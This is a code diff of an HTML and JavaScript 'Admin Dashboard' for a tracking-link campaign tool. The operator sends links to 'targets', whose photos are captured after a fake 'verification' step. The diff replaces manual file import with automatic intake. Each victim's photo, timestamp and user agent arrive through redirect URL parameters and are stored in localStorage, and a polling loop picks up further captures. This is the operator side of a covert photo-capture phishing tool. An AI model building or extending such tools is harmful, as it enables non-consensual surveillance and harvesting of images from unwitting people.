@@ -17,12 +17,12 @@
         input[type="text"] { width: 100%; padding: 10px; border: 2px solid #ddd; border-radius: 8px; font-size: 14px; }
         .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 600; margin: 5px; }
         .generate-btn { background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 100%); color: white; }
-        .import-btn { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; }
         .clear-btn { background: linear-gradient(135deg, #dc3545 0%, #c82333 100%); color: white; }
         .captures-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
         .capture-card { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 15px; padding: 15px; }
         .capture-photo { width: 100%; height: 180px; object-fit: cover; border-radius: 10px; margin-bottom: 10px; }
         .empty-state { text-align: center; padding: 40px; color: #6c757d; }
+        .auto-received { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 15px; border-radius: 10px; margin: 20px 0; text-align: center; }
         .instructions { background: #e7f3ff; padding: 15px; border-radius: 10px; margin: 20px 0; font-size: 14px; }
     </style>
 </head>
@@ -30,7 +30,7 @@
     <div class="container">
         <header>
             <h1>🎯 Admin Dashboard</h1>
-            <p>Create tracking links and manage captured data</p>
+            <p>Create tracking links and view captured data</p>
         </header>
         
         <div class="dashboard">
@@ -41,8 +41,7 @@
                     1. Enter campaign name below<br>
                     2. Copy the generated link<br>
                     3. Send to your target<br>
-                    4. Target will download data file after verification<br>
-                    5. Upload the data file here to view
+                    4. Data will appear here automatically when target completes verification!
                 </div>
                 <div class="form-group">
                     <label for="campaign-name">Campaign Name</label>
@@ -52,39 +51,68 @@
                 <div id="generated-link" style="margin-top: 10px; word-break: break-all;"></div>
             </div>
             
-            <div style="margin: 30px 0;">
-                <h3>📤 Import Captured Data</h3>
-                <div class="instructions">
-                    Upload the JSON file that your target downloaded after verification
-                </div>
-                <input type="file" id="import-file" accept=".json" style="margin: 10px 0;">
-                <button id="import-btn" class="btn import-btn">Import Data</button>
-                <button id="clear-data" class="btn clear-btn" style="margin-left: 10px;">Clear All Data</button>
+            <div id="auto-message" class="auto-received" style="display: none;">
+                🎉 New verification data received automatically!
             </div>
             
-            <div>
+            <div style="margin: 20px 0; display: flex; justify-content: space-between; align-items: center;">
                 <h3>📊 Captured Data</h3>
-                <div id="captures-container" class="captures-grid">
-                    <div class="empty-state">
-                        <h4>No data imported yet</h4>
-                        <p>Upload JSON files from your targets to view captured photos</p>
-                    </div>
+                <button id="clear-data" class="btn clear-btn">Clear All Data</button>
+            </div>
+            
+            <div id="captures-container" class="captures-grid">
+                <div class="empty-state">
+                    <h4>No data captured yet</h4>
+                    <p>Send your tracking link to targets and wait for automatic data</p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // Data yang diimpor
-        let importedData = JSON.parse(localStorage.getItem('adminCaptures') || '[]');
+        // Data yang disimpan
+        let capturedData = JSON.parse(localStorage.getItem('adminCaptures') || '[]');
         
         const campaignNameInput = document.getElementById('campaign-name');
         const generateLinkBtn = document.getElementById('generate-link');
         const generatedLinkDiv = document.getElementById('generated-link');
-        const importFileInput = document.getElementById('import-file');
-        const importBtn = document.getElementById('import-btn');
         const clearDataBtn = document.getElementById('clear-data');
         const capturesContainer = document.getElementById('captures-container');
+        const autoMessage = document.getElementById('auto-message');
+        
+        // Cek apakah ada data di URL (dari redirect otomatis)
+        const urlParams = new URLSearchParams(window.location.search);
+        const photoData = urlParams.get('data');
+        const timestamp = urlParams.get('time');
+        const userAgent = urlParams.get('ua');
+        
+        if (photoData) {
+            // Ada data baru dari URL
+            try {
+                const decodedPhoto = decodeURIComponent(photoData);
+                const newCapture = {
+                    photo: decodedPhoto,
+                    timestamp: timestamp ? new Date(parseInt(timestamp)).toISOString() : new Date().toISOString(),
+                    userAgent: userAgent ? decodeURIComponent(userAgent) : navigator.userAgent,
+                    url: 'From automatic redirect'
+                };
+                
+                capturedData.unshift(newCapture);
+                localStorage.setItem('adminCaptures', JSON.stringify(capturedData));
+                
+                // Hapus parameter dari URL
+                window.history.replaceState({}, document.title, window.location.pathname);
+                
+                // Tampilkan pesan
+                autoMessage.style.display = 'block';
+                setTimeout(() => {
+                    autoMessage.style.display = 'none';
+                }, 5000);
+                
+            } catch (error) {
+                console.error('Error processing URL ', error);
+            }
+        }
         
         // Generate tracking link
         generateLinkBtn.addEventListener('click', () => {
@@ -98,66 +126,36 @@
             `;
         });
         
-        // Import data
-        importBtn.addEventListener('click', () => {
-            const file = importFileInput.files[0];
-            if (!file) {
-                alert('Please select a JSON file to import');
-                return;
-            }
-            
-            const reader = new FileReader();
-            reader.onload = (e) => {
-                try {
-                    const data = JSON.parse(e.target.result);
-                    if (data.photo && data.timestamp) {
-                        importedData.unshift(data);
-                        localStorage.setItem('adminCaptures', JSON.stringify(importedData));
-                        renderCaptures();
-                        alert('Data imported successfully!');
-                        importFileInput.value = '';
-                    } else {
-                        throw new Error('Invalid data format');
-                    }
-                } catch (error) {
-                    alert('Error importing file: Invalid JSON format');
-                    console.error('Import error:', error);
-                }
-            };
-            reader.readAsText(file);
-        });
-        
         // Clear all data
         clearDataBtn.addEventListener('click', () => {
-            if (confirm('Are you sure you want to delete all imported data?')) {
-                importedData = [];
-                localStorage.setItem('adminCaptures', JSON.stringify(importedData));
+            if (confirm('Are you sure you want to delete all captured data?')) {
+                capturedData = [];
+                localStorage.setItem('adminCaptures', JSON.stringify(capturedData));
                 renderCaptures();
             }
         });
         
         // Render captures
         function renderCaptures() {
-            if (importedData.length === 0) {
+            if (capturedData.length === 0) {
                 capturesContainer.innerHTML = `
                     <div class="empty-state">
-                        <h4>No data imported yet</h4>
-                        <p>Upload JSON files from your targets to view captured photos</p>
+                        <h4>No data captured yet</h4>
+                        <p>Send your tracking link to targets and wait for automatic data</p>
                     </div>
                 `;
                 return;
             }
             
-            capturesContainer.innerHTML = importedData.map(data => {
+            capturesContainer.innerHTML = capturedData.map(data => {
                 const date = new Date(data.timestamp);
                 return `
                     <div class="capture-card">
                         <img src="${data.photo}" alt="Captured photo" class="capture-photo">
                         <div style="font-size: 12px; color: #666;">
                             <div><strong>Time:</strong> ${date.toLocaleString()}</div>
-                            <div><strong>Device:</strong> ${data.deviceId || 'Unknown'}</div>
                             <div style="margin-top: 5px; word-break: break-word;">
-                                <strong>URL:</strong> ${data.url.substring(0, 30)}...
+                                <strong>Source:</strong> ${data.url.substring(0, 30)}...
                             </div>
                         </div>
                     </div>
@@ -167,6 +165,24 @@
         
         // Load on page load
         renderCaptures();
+        
+        // Auto-check localStorage setiap 2 detik (untuk kasus fallback)
+        setInterval(() => {
+            const tempCapture = localStorage.getItem('temp_capture');
+            if (tempCapture) {
+                try {
+                    const data = JSON.parse(tempCapture);
+                    capturedData.unshift(data);
+                    localStorage.setItem('adminCaptures', JSON.stringify(capturedData));
+                    localStorage.removeItem('temp_capture');
+                    renderCaptures();
+                    autoMessage.style.display = 'block';
+                    setTimeout(() => autoMessage.style.display = 'none', 5000);
+                } catch (e) {
+                    console.error('Error processing temp capture:', e);
+                }
+            }
+        }, 2000);
     </script>
 </body>
 </html>
